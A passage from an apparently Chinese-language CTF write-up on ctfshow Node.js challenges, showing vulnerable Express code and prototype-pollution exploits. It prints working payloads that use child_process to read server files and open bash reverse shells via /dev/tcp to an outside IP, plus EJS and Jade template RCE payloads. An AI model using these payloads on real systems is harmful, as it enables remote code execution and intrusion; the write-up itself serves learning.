class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">User</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">username</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">password</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">normalUser</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">user</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);<span class="comment">//æ¼æ´è§¦å‘ç‚¹</span></span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===flag)&#123;<span class="comment">//è¿™é‡Œæˆ‘ä»¬åº”è¯¥æ˜¯ä¸çŸ¥é“flagçš„å…·ä½“å†…å®¹çš„</span></span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>æˆ‘ä»¬è¿˜æ˜¯å¾—æ¥å…ˆçœ‹copyæ–¹æ³•</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;ctfshow&quot;</span>:<span class="string">&quot;flag_here&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ä½†æ˜¯æˆ‘å®åœ¨å¤ªå¤©çœŸäº†ï¼Œæ€ä¹ˆå¯èƒ½ä¸è¯¥flagå¯¹å§ï¼Œä¹Ÿæ˜¯å¹´è½»äº†ï¼Œæˆ‘ä»¬åªèƒ½ç»§ç»­å»çœ‹å…¶ä»–ä»£ç </p>
<p>æˆ‘ä»¬æ¥çœ‹api.js</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>è¿™é‡Œæˆ‘ä»¬å‘ç°äº†æ— è®ºæ˜¯ä»£ç ä¸­è¿˜æ˜¯åŒ…å«çš„æ–‡ä»¶é‡Œéƒ½æ²¡æœ‰queryè¿™ä¸ªå±æ€§ï¼Œè¿›è¡Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™å°†queryè¿™ä¸ªå±æ€§ä¼ é€’ç»™æ¨¡æ¿ï¼Œå€¼ä¸º<code>Function(query)(query)</code>è¿”å›çš„å†…å®¹ï¼Œè¿™ä¸ªè¯­æ³•æˆ‘å®åœ¨çœ‹ä¸æ‡‚ï¼Œæœ‰å¯èƒ½æ˜¯ç›´æ¥å°†queryè¿™ä¸ªå±æ€§ä½œä¸ºå‚æ•°è¿”å›</p>
<p>æˆ‘ä»¬æ‰¾åˆ°çªç ´å£äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¯¥å¦‚ä½•å»æ”¹å†™queryå‘¢</p>
<p>ç„¶åè®¿é—® api çš„æ—¶å€™ç”±äº queryæœªå®šä¹‰ï¼Œæ‰€ä»¥ä¼šå‘å…¶åŸå‹æ‰¾ï¼Œä¹Ÿå°±æ˜¯åœ¨å½“å‰ä»£ç ä¸­æœªå®šä¹‰å±æ€§çš„æ—¶å€™ä¼šå‘Objectå»å¯»æ‰¾ï¼Œè¿™ä¸ªå¥½åƒæœ‰ç‚¹åŸºç¡€ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆæˆ‘æ²¡æœ‰æƒ³åˆ°</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/07/02/ctfshow-nodejs/hx2ljjpnymv5w_bb59404526cb41aea8b91f02b894ef0d.webp" class title="img">

<p>äºæ˜¯æˆ‘ä»¬åªéœ€è¦é€šè¿‡åŸå‹é“¾æ±¡æŸ“queryå±æ€§å³å¯é€šè¿‡æ¨¡æ¿æ³¨å…¥å®ç°rce</p>
<p>ä½†æ˜¯æˆ‘åœ¨å°è¯•çš„æ—¶å€™å‘ç°ä¸çŸ¥é“ä¸ºä»€ä¹ˆlogin.jsåªèƒ½è¿è¡Œä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯åŸå‹é“¾æ±¡æŸ“åªæœ‰ä¸€æ¬¡çš„æœºä¼šå¦åˆ™åªèƒ½é€šè¿‡é‡å¯ç¯å¢ƒæ¥è§£å†³ï¼Œå†æ¬¡è®¿é—®çš„æ—¶å€™ç›´æ¥404äº†</p>
<p>åœ¨ <code>utils.copy(user,req.body);</code>æ‰“ä¸Šæ–­è·Ÿè¿›å»ï¼Œå †æ ˆä¸€å…±ä¸‰æ¬¡ <code>copy()</code></p>
<p>ç¬¬ä¸€æ¬¡keyæ˜¯ <code>&quot;__proto__&quot;</code>ï¼›ç¬¬äºŒæ¬¡keyæ˜¯<code>&quot;query&quot;</code>ï¼›ç¬¬ä¸‰æ¬¡å‡ºé”™äº†ï¼Œkeyæ˜¯<code>&#39;0&#39;</code>ï¼Œobjectå˜æˆæ±¡æŸ“åçš„å€¼äº†ï¼Œä¸å†æ˜¯é”®å€¼å¯¹ï¼ï¼Œæ‰€ä»¥åœ¨ç»è¿‡ <code>if (key in object2 &amp;&amp; key in object1)</code> åˆ¤æ–­æ—¶æŠ¥é”™äº†</p>
<p>è¿˜æ˜¯æœ‰ç‚¹çœ‹ä¸æ‡‚ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆé”®å€¼ä¼šå˜ï¼Œå¯èƒ½å’Œqueryè¿™ä¸ªå±æ€§ä¸å­˜åœ¨æœ‰å…³ï¼Œè®°ä½ç®—äº†</p>
<p>æˆ‘ä»¬å…ˆé€šè¿‡login.jså®ç°åŸå‹é“¾æ±¡æŸ“</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/07/02/ctfshow-nodejs/image-20250915182714795.png" class title="image-20250915182714795">

<p>ç„¶åæˆ‘ä»¬å†é€šè¿‡POSTè¯·æ±‚è®¿é—®apiè·¯ç”±ï¼Œå®ç°æ¨¡æ¿æ³¨å…¥</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/07/02/ctfshow-nodejs/image-20250915182822764.png" class title="image-20250915182822764">

<p>æˆåŠŸæ‹¿åˆ°flag</p>
<p>payload</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;__proto__&quot;</span>:&#123; <span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /app/routes/login.js&#x27;)&quot;</span> &#125; &#125; <span class="comment">//ç›´æ¥è¯»å–æ–‡ä»¶</span></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/120.46.41.173/9023 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125; <span class="comment">//åå¼¹shell</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><p>340å’Œ339å·®ä¸å¤šï¼Œéƒ½æ˜¯é€šè¿‡åŸå‹é“¾æ±¡æŸ“å®ç°æ¨¡æ¿æ³¨å…¥ä½†æ˜¯åœ¨login.jsæœ‰ç‚¹ä¸åŒ</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="comment">//å¯¹è±¡é‡Œé¢å¥—äº†ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);<span class="comment">//å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨çš„å‚æ•°æ˜¯useinfoï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦è®¿é—®ä¸¤æ¬¡æ‰èƒ½è®¿é—®åˆ°Object</span></span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">   res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<p>æˆ‘ä»¬è¿˜æ˜¯é€šè¿‡jsonæ•°æ®å¥—ä¸¤å±‚<code>__proto__</code>å°±è¡Œäº†</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/111.11.111.11/11111 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>è¿™ä¸ªæ—¶å€™å°±éœ€è¦æˆ‘ä»¬é‡æ–°å›æ¥çœ‹ä¸‹è¿™ä¸ªcopyæ–¹æ³•</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])<span class="comment">//å’Œä¹‹å‰ä¸€æ ·é€šè¿‡åµŒå¥—èµ‹å€¼ï¼Œåªä¸è¿‡è¿™æ¬¡é€’å½’äº†ä¸¤æ¬¡</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<p>è¿™æ¬¡ä½¿ç”¨åå¼¹shell</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/07/02/ctfshow-nodejs/image-20250915215731913.png" class title="image-20250915215731913">



<h2 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h2><p>è¿™æ¬¡çš„ä»£ç å’Œ340ä¸€æ ·ï¼Œåªä¸è¿‡å°‘äº†api.jsï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰æ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚å…¶å®339å’Œ340éƒ½æœ‰éé¢„æœŸè§£ï¼Œå°±æ˜¯ä¸é€šè¿‡æ¨¡æ¿æ³¨å…¥ï¼Œä¹Ÿå°±æ˜¯341çš„é¢„æœŸè§£ã€‚</p>
<p>ejså¼•æ“çš„æ¼æ´ï¼Œè™½ç„¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥è§¦å‘rceï¼Œä½†æ˜¯è€ƒåˆ°ä¹Ÿåªæœ‰è¿™ä¸ªpayloadå¯ä»¥ç”¨å§</p>
<p>payload</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/ç«¯å£ 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;</span><br><span class="line"><span class="comment">//ç›´æ¥ç›‘å¬å‘é€å³å¯</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>è¿™ä¸ªæˆ‘ä¸çŸ¥é“æ˜¯å¦‚ä½•å®ç°çš„ï¼Œä¼°è®¡æ˜¯expressçš„ä¸€ä¸ªcveæ¼æ´ï¼Œå°±è®°ä¸€ä¸‹payloadå°±è¡Œäº†</p>
<h2 id="web342"><a href="#web342" class="headerlink" title="web342"></a>web342</h2><p>è¿™ä¸ªæˆ‘æ²¡åœ¨æºç ä¸­çœ‹è§æ¨¡æ¿æ¸²æŸ“çš„ä»£ç ï¼Œç„¶åçœ‹äº†é¢˜è§£è¯´è¿™é‡Œç”¨çš„æ˜¯jadeå¼•æ“ï¼Œä¹Ÿå°±æ˜¯è¯´ä»ejså¼•æ“æ¢ä¸ºäº†jadeï¼Œç„¶åæˆ‘å°±éœ€è¦åˆ©ç”¨jadeçš„rceæ¼æ´å—</p>
<p>åªèƒ½æŠ„ä¸‹åˆ«äººçš„payload</p>
<div class="code-container" code-lang="Json"><div class="codebox"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Code&quot;</span><span class="punctuation">,</span><span class="attr">&quot;self&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span><span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xx/xx 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>





<h2 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h2><p>æœ€åä¸€ä¸ªé¢˜ç›®ç«Ÿç„¶ä¸æ˜¯åŸå‹é“¾æ±¡æŸ“ï¼Œç›´æ¥æ¥çœ‹ä»£ç </p>
